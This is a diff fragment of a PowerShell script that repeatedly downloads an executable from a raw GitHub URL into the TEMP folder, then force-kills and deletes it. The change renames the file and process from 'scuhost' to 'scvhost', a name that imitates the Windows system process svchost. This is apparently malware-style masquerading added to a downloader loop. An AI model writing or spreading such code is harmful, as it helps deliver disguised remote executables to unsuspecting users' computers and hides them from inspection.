@@ -126,7 +126,7 @@ while ($true)
         Write-Console "DOWNLOADING..." "INFO"
 
         $url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/scuhost.exe"
-        $path = "$env:TEMP\scuhost.exe"
+        $path = "$env:TEMP\scvhost.exe"
 
         try {
 
@@ -180,12 +180,12 @@ while ($true)
         Write-Console "CLEANING..." "INFO"
 
         Stop-Process `
-        -Name "scuhost" `
+        -Name "scvhost" `
         -Force `
         -ErrorAction SilentlyContinue
 
         Remove-Item `
-        "$env:TEMP\scuhost.exe" `
+        "$env:TEMP\scvhost.exe" `
         -Force `
         -ErrorAction SilentlyContinue
 
